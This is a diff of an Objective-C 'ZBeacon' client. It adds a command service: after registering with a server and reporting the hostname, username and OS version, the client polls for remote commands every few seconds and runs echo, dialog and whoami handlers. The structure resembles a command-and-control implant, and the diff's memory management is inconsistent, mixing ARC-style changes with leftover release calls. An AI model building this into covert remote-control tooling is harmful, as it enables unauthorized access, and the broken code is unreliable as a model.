@@ -1,50 +1,74 @@
 #import "ZBeacon.h"
 #import "ZAPIClient.h"
 #import "ZSystemInfo.h"
+#import "ZCommandService.h"
+#import "ZCommandRegistry.h"
+#import "ZCommandHandler.h"
+#import "ZCommandModel.h"
+#import "commands/ZEchoCommandHandler.h"
+#import "commands/ZDialogCommandHandler.h"
+#import "commands/ZWhoAmICommandHandler.h"
 
-// Domain for beacon errors
-NSString *const ZBeaconErrorDomain = @"com.zbeacon.error";
+// Define default configuration values
+const ZBeaconConfiguration ZBeaconDefaultConfiguration = {
+    .pingInterval = 300,         // 5 minutes
+    .initialRetryDelay = 5,      // 5 seconds
+    .maxRetryDelay = 3600,       // 1 hour
+    .maxRetryAttempts = 10,      // 10 attempts
+    .commandPollInterval = 5     // 5 seconds instead of 60 seconds
+};
+
+// Error domains and codes
+static NSString *const ZBeaconErrorDomain = @"ZBeaconErrorDomain";
+static const NSInteger __unused ZBeaconErrorRegistrationFailed = 100;
+static const NSInteger __unused ZBeaconErrorPingFailed = 101;
+static const NSInteger __unused ZBeaconErrorNotRegistered = 102;
+static const NSInteger __unused ZBeaconErrorInvalidResponse = 103;
+static const NSInteger __unused ZBeaconErrorNetworkError = 104;
 
 // Status constants
-NSString *const ZBeaconStatusInitializing = @"initializing";
-NSString *const ZBeaconStatusOnline = @"online";
-NSString *const ZBeaconStatusOffline = @"offline";
-NSString *const ZBeaconStatusError = @"error";
+static NSString *const ZBeaconStatusInitializing = @"initializing";
+static NSString *const ZBeaconStatusOnline = @"online";
+static NSString *const ZBeaconStatusOffline = @"offline";
+static NSString *const ZBeaconStatusError = @"error";
 
 // Constants
-static const NSTimeInterval kInitialRetryDelay = 5.0;  // 5 seconds
-static const NSTimeInterval kMaxRetryDelay = 60.0;     // 1 minute
-static const int kMaxRetryAttempts = 5;                // Maximum number of retry attempts
+static const NSTimeInterval __unused kInitialRetryDelay = 5.0;  // 5 seconds
+static const NSTimeInterval __unused kMaxRetryDelay = 60.0;     // 1 minute
+static const int __unused kMaxRetryAttempts = 5;                // Maximum number of retry attempts
 
 // Private interface extensions
-@interface ZBeacon ()
+@interface ZBeacon () <ZCommandServiceDelegate>
 
 // Make properties readwrite in private interface
 @property (nonatomic, copy, readwrite) NSString *beaconId;
 @property (nonatomic, copy, readwrite) NSString *lastSeen;
 @property (nonatomic, copy, readwrite) NSString *status;
-@property (nonatomic, copy, readwrite) NSString *hostname;
-@property (nonatomic, copy, readwrite) NSString *username;
-@property (nonatomic, copy, readwrite) NSString *osVersion;
+@property (nonatomic, copy, readwrite, nullable) NSString *hostname;
+@property (nonatomic, copy, readwrite, nullable) NSString *username;
+@property (nonatomic, copy, readwrite, nullable) NSString *osVersion;
 @property (nonatomic, strong, readwrite) ZAPIClient *apiClient;
 @property (nonatomic, assign, readwrite, getter=isRunning) BOOL running;
 @property (nonatomic, assign, readwrite) ZBeaconConfiguration configuration;
+@property (nonatomic, retain) ZCommandService *commandService;
 
 // Private properties
-@property (nonatomic, strong) NSTimer *pingTimer;
+@property (nonatomic, strong, nullable) NSTimer *pingTimer;
 @property (nonatomic, strong) dispatch_queue_t beaconQueue;
 @property (nonatomic, strong) dispatch_queue_t networkQueue;
 @property (nonatomic, assign) NSUInteger retryCount;
 @property (nonatomic, assign) NSTimeInterval currentRetryDelay;
 @property (nonatomic, strong) NSDateFormatter *timestampFormatter;
 @property (nonatomic, strong) dispatch_source_t registrationTimer;
+@property (nonatomic, assign) BOOL isRegistering;
+@property (nonatomic, assign) BOOL isPinging;
 
 // Private methods
 - (void)setupTimestampFormatter;
 - (NSError *)errorWithCode:(NSInteger)code description:(NSString *)description;
 - (void)notifyDelegateOfStatusChange;
-- (BOOL)registerWithServerWithCompletion:(void(^)(BOOL success, NSError *error))completion;
-- (void)pingServerInternal:(void(^)(BOOL success, NSError *error, NSDictionary *response))completion;
+- (BOOL)registerWithServerWithCompletion:(void(^)(BOOL success, NSError * _Nullable error))completion;
+- (void)pingServerInternal:(void(^)(BOOL success, NSError * _Nullable error, NSDictionary * _Nullable response))completion;
 - (void)scheduleRetry;
 - (void)cancelRetryTimer;
 - (void)setStatusSafely:(NSString *)newStatus;
@@ -67,22 +91,21 @@ static const int kMaxRetryAttempts = 5;                // Maximum number of retr
 
 #pragma mark - Lifecycle
 
-- (instancetype)initWithServerURL:(NSURL *)serverURL {
-    return [self initWithServerURL:serverURL configuration:[ZBeacon defaultConfiguration]];
-}
-
 - (instancetype)init {
     [self doesNotRecognizeSelector:_cmd];
     return nil;
 }
 
-- (instancetype)initWithServerURL:(NSURL *)serverURL configuration:(ZBeaconConfiguration)configuration {
+- (nullable instancetype)initWithServerURL:(NSURL *)serverURL {
+    return [self initWithServerURL:serverURL configuration:ZBeaconDefaultConfiguration];
+}
+
+- (nullable instancetype)initWithServerURL:(NSURL *)serverURL configuration:(ZBeaconConfiguration)configuration {
     @try {
         self = [super init];
         if (self) {
             if (!serverURL) {
                 [self logMessage:@"Error: Cannot initialize ZBeacon with nil serverURL"];
-                [self release];
                 return nil;
             }
             
@@ -93,16 +116,13 @@ static const int kMaxRetryAttempts = 5;                // Maximum number of retr
             _apiClient = [[ZAPIClient alloc] initWithServerURL:serverURL];
             if (!_apiClient) {
                 [self logMessage:@"Error: Failed to create API client"];
-                [self release];
                 return nil;
             }
             
             // Initialize properties
             _beaconId = [[NSUUID UUID] UUIDString];
-            [_beaconId retain];
-            
-            _status = [ZBeaconStatusInitializing retain];
-            _lastSeen = [[self currentTimestampString] retain];
+            _status = ZBeaconStatusInitializing;
+            _lastSeen = [self currentTimestampString];
             _retryCount = 0;
             _currentRetryDelay = configuration.initialRetryDelay;
             
@@ -114,8 +134,8 @@ static const int kMaxRetryAttempts = 5;                // Maximum number of retr
             // Setup timestamp formatter
             [self setupTimestampFormatter];
             
-            // Get system information synchronously during initialization
-            [self collectSystemInformationSync];
+            // Get system information safely
+            [self collectSystemInformation];
             
             [self logMessage:@"Beacon initialized with ID: %@", _beaconId];
             [self logMessage:@"System info: hostname=%@, username=%@, os=%@", 
@@ -127,49 +147,19 @@ static const int kMaxRetryAttempts = 5;                // Maximum number of retr
     }
     @catch (NSException *exception) {
         [self logMessage:@"Exception during beacon initialization: %@", exception];
-        [self release];
         return nil;
     }
 }
 
-- (void)collectSystemInformationSync {
-    @try {
-        // Get system information synchronously
-        self.hostname = [[ZSystemInfo hostname] retain];
-        self.username = [[ZSystemInfo username] retain];
-        self.osVersion = [[ZSystemInfo osVersion] retain];
-    }
-    @catch (NSException *exception) {
-        [self logMessage:@"Error collecting system information: %@", exception];
-    }
-}
-
-- (void)updateSystemInformationAsync {
-    // We still provide an async method to update system info after initialization
+- (void)collectSystemInformation {
     dispatch_async(dispatch_get_global_queue(QOS_CLASS_UTILITY, 0), ^{
         @try {
-            NSString *newHostname = [ZSystemInfo hostname];
-            NSString *newUsername = [ZSystemInfo username];
-            NSString *newOSVersion = [ZSystemInfo osVersion];
-            
-            dispatch_async(self.beaconQueue, ^{
-                [self.hostname release];
-                self.hostname = [newHostname retain];
-                
-                [self.username release];
-                self.username = [newUsername retain];
-                
-                [self.osVersion release];
-                self.osVersion = [newOSVersion retain];
-                
-                [self logMessage:@"System info updated: hostname=%@, username=%@, os=%@", 
-                    self.hostname ?: @"(unknown)", 
-                    self.username ?: @"(unknown)", 
-                    self.osVersion ?: @"(unknown)"];
-            });
+            self.hostname = [ZSystemInfo hostname];
+            self.username = [ZSystemInfo username];
+            self.osVersion = [ZSystemInfo osVersion];
         }
         @catch (NSException *exception) {
-            [self logMessage:@"Error updating system information: %@", exception];
+            [self logMessage:@"Error collecting system information: %@", exception];
         }
     });
 }
@@ -195,16 +185,15 @@ static const int kMaxRetryAttempts = 5;                // Maximum number of retr
     [_username release];
     [_osVersion release];
     [_apiClient release];
+    [_commandService release];
     [_timestampFormatter release];
     
     if (_beaconQueue) {
         dispatch_release(_beaconQueue);
     }
-    
     if (_networkQueue) {
         dispatch_release(_networkQueue);
     }
-    
     if (_registrationTimer) {
         dispatch_source_cancel(_registrationTimer);
         dispatch_release(_registrationTimer);
@@ -232,17 +221,11 @@ static const int kMaxRetryAttempts = 5;                // Maximum number of retr
             self.currentRetryDelay = self.configuration.initialRetryDelay;
             
             // Register with server
-            [self registerWithServerWithCompletion:^(BOOL success, NSError *error) {
+            [self registerWithServerWithCompletion:^(BOOL success, NSError * _Nullable __unused error) {
                 if (!success) {
                     // If initial registration fails, still return success but schedule retry
                     [self scheduleRetry];
                 }
-                
-                // Schedule periodic system info updates
-                dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(300 * NSEC_PER_SEC)), self.beaconQueue, ^{
-                    [self updateSystemInformationAsync];
-                });
-                
                 // We still mark startup as successful even if registration failed
                 // since the beacon process is running and will retry
             }];
@@ -299,7 +282,7 @@ static const int kMaxRetryAttempts = 5;                // Maximum number of retr
         return NO;
     }
     
-    [self pingServerInternal:^(BOOL success, NSError *error, NSDictionary *response) {
+    [self pingServerInternal:^(BOOL success, NSError * _Nullable error, NSDictionary * _Nullable response) {
         if (success) {
             [self logMessage:@"Forced ping successful: %@", response];
         } else {
@@ -314,22 +297,21 @@ static const int kMaxRetryAttempts = 5;                // Maximum number of retr
 
 - (void)setStatusSafely:(NSString *)newStatus {
     if (![self.status isEqualToString:newStatus]) {
-        [self.status release];
-        self.status = [newStatus retain];
+        self.status = newStatus;
         [self notifyDelegateOfStatusChange];
     }
 }
 
 - (void)notifyDelegateOfStatusChange {
     id<ZBeaconDelegate> delegate = self.delegate;
-    if ([delegate respondsToSelector:@selector(beacon:didChangeStatus:)]) {
+    if ([(NSObject *)delegate respondsToSelector:@selector(beacon:didChangeStatus:)]) {
         dispatch_async(dispatch_get_main_queue(), ^{
             [delegate beacon:self didChangeStatus:self.status];
         });
     }
 }
 
-- (BOOL)registerWithServerWithCompletion:(void(^)(BOOL success, NSError *error))completion {
+- (BOOL)registerWithServerWithCompletion:(void(^)(BOOL success, NSError * _Nullable error))completion {
     @try {
         if (!self.isRunning) {
             NSError *error = [self errorWithCode:100 description:@"Cannot register - beacon is not running"];
@@ -349,53 +331,48 @@ static const int kMaxRetryAttempts = 5;                // Maximum number of retr
         
         [self logMessage:@"Registration data: %@", registrationData];
         
-        // Create a block to retain 'self' for the operation
-        ZBeacon *blockSelf = self;
-        [blockSelf retain]; // Retain for the async operation
-        
         // Send init request to server
         dispatch_async(self.networkQueue, ^{
-            [blockSelf.apiClient sendInitRequestWithData:registrationData completion:^(NSDictionary *response, NSError *error) {
-                dispatch_async(blockSelf.beaconQueue, ^{
-                    if (!blockSelf.isRunning) {
+            [self.apiClient sendInitRequestWithData:registrationData completion:^(NSDictionary *response, NSError *error) {
+                dispatch_async(self.beaconQueue, ^{
+                    if (!self.isRunning) {
                         // Beacon was stopped during the network request
-                        [blockSelf release]; // Balance the retain
                         return;
                     }
                     
                     if (error) {
-                        [blockSelf logMessage:@"Error registering beacon: %@", error.localizedDescription];
-                        [blockSelf setStatusSafely:ZBeaconStatusError];
+                        [self logMessage:@"Error registering beacon: %@", error.localizedDescription];
+                        [self setStatusSafely:ZBeaconStatusError];
                         
                         // Notify delegate
-                        id<ZBeaconDelegate> delegate = blockSelf.delegate;
-                        if ([delegate respondsToSelector:@selector(beacon:didFailToRegisterWithError:willRetry:)]) {
-                            BOOL willRetry = blockSelf.retryCount < blockSelf.configuration.maxRetryAttempts;
+                        id<ZBeaconDelegate> delegate = self.delegate;
+                        if ([(NSObject *)delegate respondsToSelector:@selector(beacon:didFailToRegisterWithError:willRetry:)]) {
+                            BOOL willRetry = self.retryCount < self.configuration.maxRetryAttempts;
                             dispatch_async(dispatch_get_main_queue(), ^{
-                                [delegate beacon:blockSelf didFailToRegisterWithError:error willRetry:willRetry];
+                                [delegate beacon:self didFailToRegisterWithError:error willRetry:willRetry];
                             });
                         }
                         
                         if (completion) completion(NO, error);
-                        [blockSelf release]; // Balance the retain
                         return;
                     }
                     
                     // Registration successful, reset retry counters
-                    blockSelf.retryCount = 0;
-                    blockSelf.currentRetryDelay = blockSelf.configuration.initialRetryDelay;
+                    self.retryCount = 0;
+                    self.currentRetryDelay = self.configuration.initialRetryDelay;
                     
-                    [blockSelf logMessage:@"Beacon registered successfully: %@", response];
-                    [blockSelf setStatusSafely:ZBeaconStatusOnline];
+                    [self logMessage:@"Beacon registered successfully: %@", response];
+                    [self setStatusSafely:ZBeaconStatusOnline];
+                    self.lastSeen = [self currentTimestampString];
                     
-                    [blockSelf.lastSeen release];
-                    blockSelf.lastSeen = [[blockSelf currentTimestampString] retain];
+                    // Initialize the command service after successful registration
+                    [self initializeCommandService];
                     
                     // Notify delegate
-                    id<ZBeaconDelegate> delegate = blockSelf.delegate;
-                    if ([delegate respondsToSelector:@selector(beacon:didRegisterWithResponse:)]) {
+                    id<ZBeaconDelegate> delegate = self.delegate;
+                    if ([(NSObject *)delegate respondsToSelector:@selector(beacon:didRegisterWithResponse:)]) {
                         dispatch_async(dispatch_get_main_queue(), ^{
-                            [delegate beacon:blockSelf didRegisterWithResponse:response];
+                            [delegate beacon:self didRegisterWithResponse:response];
                         });
                     }
                     
@@ -403,32 +380,31 @@ static const int kMaxRetryAttempts = 5;                // Maximum number of retr
                     dispatch_async(dispatch_get_main_queue(), ^{
                         @try {
                             // Cancel any existing timer first
-                            if (blockSelf.pingTimer) {
-                                [blockSelf.pingTimer invalidate];
-                                blockSelf.pingTimer = nil;
+                            if (self.pingTimer) {
+                                [self.pingTimer invalidate];
+                                self.pingTimer = nil;
                             }
                             
                             // Create new timer
-                            blockSelf.pingTimer = [NSTimer timerWithTimeInterval:blockSelf.configuration.pingInterval
-                                                                     target:blockSelf
+                            self.pingTimer = [NSTimer timerWithTimeInterval:self.configuration.pingInterval
+                                                                     target:self
                                                                    selector:@selector(pingTimerFired)
                                                                    userInfo:nil
                                                                     repeats:YES];
                             
                             // Add to run loop
                             NSRunLoop *runLoop = [NSRunLoop currentRunLoop];
-                            [runLoop addTimer:blockSelf.pingTimer forMode:NSRunLoopCommonModes];
+                            [runLoop addTimer:self.pingTimer forMode:NSRunLoopCommonModes];
                             
                             // Send initial ping immediately
-                            [blockSelf performSelector:@selector(pingTimerFired) withObject:nil afterDelay:0.1];
+                            [self performSelector:@selector(pingTimerFired) withObject:nil afterDelay:0.1];
                         }
                         @catch (NSException *exception) {
-                            [blockSelf logMessage:@"Exception setting up ping timer: %@", exception];
+                            [self logMessage:@"Exception setting up ping timer: %@", exception];
                         }
                     });
                     
                     if (completion) completion(YES, nil);
-                    [blockSelf release]; // Balance the retain
                 });
             }];
         });
@@ -447,16 +423,16 @@ static const int kMaxRetryAttempts = 5;                // Maximum number of retr
     [self pingServerInternal:nil];
 }
 
-- (void)pingServerInternal:(void(^)(BOOL success, NSError *error, NSDictionary *response))completion {
-    if (!self.isRunning) {
-        [self logMessage:@"Beacon is not running. Skipping ping."];
-        NSError *error = [self errorWithCode:102 description:@"Beacon is not running"];
-        if (completion) completion(NO, error, nil);
-        return;
-    }
-    
+- (void)pingServerInternal:(void(^)(BOOL success, NSError * _Nullable error, NSDictionary * _Nullable response))completion {
     dispatch_async(self.beaconQueue, ^{
         @try {
+            if (!self.isRunning) {
+                [self logMessage:@"Beacon is not running. Skipping ping."];
+                NSError *error = [self errorWithCode:102 description:@"Beacon is not running"];
+                if (completion) completion(NO, error, nil);
+                return;
+            }
+            
             [self logMessage:@"Pinging server with beacon ID: %@", self.beaconId];
             
             // Prepare ping data
@@ -466,45 +442,37 @@ static const int kMaxRetryAttempts = 5;                // Maximum number of retr
                 @"timestamp": [self currentTimestampString]
             };
             
-            // Retain self for the async operation
-            ZBeacon *blockSelf = self;
-            [blockSelf retain];
-            
             // Send ping request to server
             dispatch_async(self.networkQueue, ^{
-                [blockSelf.apiClient sendPingRequestWithData:pingData completion:^(NSDictionary *response, NSError *error) {
-                    dispatch_async(blockSelf.beaconQueue, ^{
+                [self.apiClient sendPingRequestWithData:pingData completion:^(NSDictionary *response, NSError *error) {
+                    dispatch_async(self.beaconQueue, ^{
                         if (error) {
-                            [blockSelf logMessage:@"Error pinging server: %@", error.localizedDescription];
+                            [self logMessage:@"Error pinging server: %@", error.localizedDescription];
                             
                             // Notify delegate
-                            id<ZBeaconDelegate> delegate = blockSelf.delegate;
-                            if ([delegate respondsToSelector:@selector(beacon:didFailToPingWithError:)]) {
+                            id<ZBeaconDelegate> delegate = self.delegate;
+                            if ([(NSObject *)delegate respondsToSelector:@selector(beacon:didFailToPingWithError:)]) {
                                 dispatch_async(dispatch_get_main_queue(), ^{
-                                    [delegate beacon:blockSelf didFailToPingWithError:error];
+                                    [delegate beacon:self didFailToPingWithError:error];
                                 });
                             }
                             
                             if (completion) completion(NO, error, nil);
-                            [blockSelf release]; // Balance the retain
                             return;
                         }
                         
-                        [blockSelf logMessage:@"Ping successful: %@", response];
-                        
-                        [blockSelf.lastSeen release];
-                        blockSelf.lastSeen = [[blockSelf currentTimestampString] retain];
+                        [self logMessage:@"Ping successful: %@", response];
+                        self.lastSeen = [self currentTimestampString];
                         
                         // Notify delegate
-                        id<ZBeaconDelegate> delegate = blockSelf.delegate;
-                        if ([delegate respondsToSelector:@selector(beacon:didPingWithResponse:)]) {
+                        id<ZBeaconDelegate> delegate = self.delegate;
+                        if ([(NSObject *)delegate respondsToSelector:@selector(beacon:didPingWithResponse:)]) {
                             dispatch_async(dispatch_get_main_queue(), ^{
-                                [delegate beacon:blockSelf didPingWithResponse:response];
+                                [delegate beacon:self didPingWithResponse:response];
                             });
                         }
                         
                         if (completion) completion(YES, nil, response);
-                        [blockSelf release]; // Balance the retain
                     });
                 }];
             });
@@ -537,41 +505,40 @@ static const int kMaxRetryAttempts = 5;                // Maximum number of retr
             
             // Create a dispatch timer for the retry
             self.registrationTimer = dispatch_source_create(DISPATCH_SOURCE_TYPE_TIMER, 0, 0, self.beaconQueue);
-            dispatch_retain(self.registrationTimer); // Retain the timer
             
             uint64_t nanoseconds = (uint64_t)(self.currentRetryDelay * NSEC_PER_SEC);
             dispatch_source_set_timer(self.registrationTimer, 
-                                     dispatch_time(DISPATCH_TIME_NOW, nanoseconds), 
-                                     DISPATCH_TIME_FOREVER, 
-                                     (1ull * NSEC_PER_SEC) / 10);
+                                      dispatch_time(DISPATCH_TIME_NOW, nanoseconds), 
+                                      DISPATCH_TIME_FOREVER, 
+                                      (1ull * NSEC_PER_SEC) / 10);
             
-            // Retain self for the async operation
-            ZBeacon *blockSelf = self;
-            [blockSelf retain];
-            
+            __block typeof(self) blockSelf = self;
             dispatch_source_set_event_handler(self.registrationTimer, ^{
                 @try {
+                    if (!blockSelf) return;
+                    
                     [blockSelf cancelRetryTimer];
                     
                     if (!blockSelf.isRunning) {
                         [blockSelf logMessage:@"Beacon is no longer running. Cancelling retry."];
-                        [blockSelf release]; // Balance the retain
                         return;
                     }
                     
                     [blockSelf logMessage:@"Retrying registration..."];
-                    [blockSelf registerWithServerWithCompletion:^(BOOL success, NSError *regError) {
+                    [blockSelf registerWithServerWithCompletion:^(BOOL success, NSError * _Nullable __unused error) {
                         if (!success) {
                             // Increase retry delay with exponential backoff (up to max delay)
+                            if (!blockSelf) return;
+                            
                             blockSelf.currentRetryDelay = MIN(blockSelf.currentRetryDelay * 2, blockSelf.configuration.maxRetryDelay);
                             [blockSelf scheduleRetry];
                         }
-                        [blockSelf release]; // Balance the initial retain
                     }];
                 }
                 @catch (NSException *exception) {
-                    [blockSelf logMessage:@"Exception during retry: %@", exception];
-                    [blockSelf release]; // Balance the retain
+                    if (blockSelf) {
+                        [blockSelf logMessage:@"Exception during retry: %@", exception];
+                    }
                 }
             });
             
@@ -587,7 +554,6 @@ static const int kMaxRetryAttempts = 5;                // Maximum number of retr
     @try {
         if (self.registrationTimer) {
             dispatch_source_cancel(self.registrationTimer);
-            dispatch_release(self.registrationTimer);
             self.registrationTimer = nil;
         }
     }
@@ -609,7 +575,7 @@ static const int kMaxRetryAttempts = 5;                // Maximum number of retr
 - (NSError *)errorWithCode:(NSInteger)code description:(NSString *)description {
     return [NSError errorWithDomain:ZBeaconErrorDomain 
                                code:code 
-                           userInfo:[NSDictionary dictionaryWithObject:description forKey:NSLocalizedDescriptionKey]];
+                           userInfo:@{NSLocalizedDescriptionKey: description}];
 }
 
 - (void)logMessage:(NSString *)format, ... {
@@ -619,7 +585,138 @@ static const int kMaxRetryAttempts = 5;                // Maximum number of retr
     va_end(args);
     
     NSLog(@"[ZBeacon %@] %@", [self.beaconId substringToIndex:8], message);
-    [message release];
+}
+
+#pragma mark - Command Service
+
+- (void)initializeCommandService {
+    if (!self.beaconId) {
+        [self logMessage:@"Cannot initialize command service: beacon is not registered"];
+        return;
+    }
+    
+    if (self.commandService) {
+        [self.commandService stop];
+        [self.commandService release];
+        self.commandService = nil;
+    }
+    
+    // Create a new command service
+    self.commandService = [[ZCommandService alloc] initWithServerURL:self.apiClient.serverURL beaconId:self.beaconId];
+    self.commandService.delegate = self;
+    self.commandService.pollInterval = self.configuration.commandPollInterval;
+    
+    // Register default command handlers
+    [self registerDefaultCommandHandlers];
+    
+    // Start the command service
+    if (![self.commandService start]) {
+        [self logMessage:@"Failed to start command service"];
+    } else {
+        [self logMessage:@"Command service started successfully"];
+    }
+}
+
+- (void)registerDefaultCommandHandlers {
+    // Register echo command handler
+    [self registerCommandHandler:@"echo" handlerClass:[ZEchoCommandHandler class]];
+    
+    // Register dialog command handler
+    [self registerCommandHandler:@"dialog" handlerClass:[ZDialogCommandHandler class]];
+    
+    // Register whoami command handler
+    [self registerCommandHandler:@"whoami" handlerClass:[ZWhoAmICommandHandler class]];
+}
+
+- (BOOL)registerCommandHandler:(NSString *)commandType handlerClass:(Class)handlerClass {
+    if (!commandType || [commandType length] == 0) {
+        NSLog(@"Cannot register handler: command type is nil or empty");
+        return NO;
+    }
+    
+    if (!handlerClass) {
+        NSLog(@"Cannot register handler: handler class is nil");
+        return NO;
+    }
+    
+    // Check if the class conforms to the ZCommandHandler protocol
+    if (![handlerClass conformsToProtocol:@protocol(ZCommandHandler)]) {
+        NSLog(@"Cannot register handler: class does not conform to ZCommandHandler protocol");
+        return NO;
+    }
+    
+    // Create an instance of the handler
+    id<ZCommandHandler> handler = [[[handlerClass alloc] init] autorelease];
+    
+    // Register with the command registry
+    return [[ZCommandRegistry sharedRegistry] registerCommandHandler:handler];
+}
+
+- (void)pollForCommands {
+    if (!self.isRunning) {
+        NSLog(@"Cannot poll for commands: beacon is not running");
+        return;
+    }
+    
+    if (!self.beaconId) {
+        NSLog(@"Cannot poll for commands: beacon is not registered");
+        return;
+    }
+    
+    if (!self.commandService) {
+        NSLog(@"Cannot poll for commands: command service is not initialized");
+        return;
+    }
+    
+    [self.commandService pollNow];
+}
+
+#pragma mark - ZCommandServiceDelegate
+
+- (void)commandService:(ZCommandService *)service didReceiveCommand:(ZCommandModel *)command {
+    [self logMessage:@"Received command: %@ (type: %@)", [command commandId], [command type]];
+    
+    // Notify the delegate
+    if (self.delegate && [(NSObject *)self.delegate respondsToSelector:@selector(beacon:didReceiveCommand:)]) {
+        dispatch_async(dispatch_get_main_queue(), ^{
+            [self.delegate beacon:self didReceiveCommand:command];
+        });
+    }
+}
+
+- (void)commandService:(ZCommandService *)service didReportCommand:(ZCommandModel *)command withResponse:(NSDictionary *)response {
+    [self logMessage:@"Command reported: %@ (status: %ld)", [command commandId], (long)[command status]];
+    
+    // Notify the delegate
+    if ([command status] == ZCommandStatusCompleted) {
+        if (self.delegate && [(NSObject *)self.delegate respondsToSelector:@selector(beacon:didExecuteCommand:withResult:)]) {
+            dispatch_async(dispatch_get_main_queue(), ^{
+                [self.delegate beacon:self didExecuteCommand:command withResult:[response objectForKey:@"result"]];
+            });
+        }
+    } else if ([command status] == ZCommandStatusFailed || [command status] == ZCommandStatusTimedOut) {
+        NSError *error = [NSError errorWithDomain:@"ZBeaconCommandError"
+                                            code:500
+                                        userInfo:[NSDictionary dictionaryWithObject:@"Command execution failed"
+                                                                           forKey:NSLocalizedDescriptionKey]];
+        
+        if (self.delegate && [(NSObject *)self.delegate respondsToSelector:@selector(beacon:didFailToExecuteCommand:withError:)]) {
+            dispatch_async(dispatch_get_main_queue(), ^{
+                [self.delegate beacon:self didFailToExecuteCommand:command withError:error];
+            });
+        }
+    }
+}
+
+- (void)commandService:(ZCommandService *)service didFailToReportCommand:(ZCommandModel *)command withError:(NSError *)error {
+    [self logMessage:@"Failed to report command: %@ (error: %@)", [command commandId], [error localizedDescription]];
+    
+    // Notify the delegate
+    if (self.delegate && [(NSObject *)self.delegate respondsToSelector:@selector(beacon:didFailToExecuteCommand:withError:)]) {
+        dispatch_async(dispatch_get_main_queue(), ^{
+            [self.delegate beacon:self didFailToExecuteCommand:command withError:error];
+        });
+    }
 }
 
 @end 
